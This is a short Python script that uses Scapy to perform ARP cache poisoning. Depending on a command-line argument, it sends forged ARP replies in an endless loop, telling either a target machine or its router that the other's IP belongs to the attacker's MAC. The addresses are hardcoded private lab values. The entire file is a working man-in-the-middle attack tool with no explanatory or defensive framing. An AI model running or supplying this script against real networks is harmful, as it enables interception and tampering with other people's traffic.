from scapy.all import *
import sys

command = sys.argv[1]


target_ip = "192.168.113.154"
router_ip = "192.168.113.2"
attacker_mac = "00:0c:29:47:ee:c2"

target_mac = "00:0c:29:67:fb:54"
router_mac = "00:50:56:e3:5b:1b"

poison_target = Ether()/ARP(op="is-at", hwdst=target_mac, hwsrc=attacker_mac, psrc=router_ip ,pdst=target_ip)

poison_router = Ether()/ARP(op="is-at", hwdst=router_mac, hwsrc=attacker_mac, psrc=target_ip ,pdst=router_ip)

if(command == "target"):
    sendp(poison_target, loop=1, inter=0.5)
elif(command == "router"):
    sendp(poison_router, loop=1, inter=0.5)
